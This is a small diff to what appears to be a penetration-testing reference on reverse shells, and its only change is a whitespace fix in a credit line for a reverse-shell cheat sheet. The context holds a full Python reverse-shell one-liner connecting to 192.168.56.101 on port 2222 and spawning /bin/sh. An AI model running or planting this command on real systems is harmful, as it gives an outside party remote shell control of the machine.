@@ -148,4 +148,4 @@ The principle here can be used with any of the command line based reverse shells
 
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.101",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-*Note: Some shells here were sourced or modified from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet *
+*Note: Some shells here were sourced or modified from http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet*
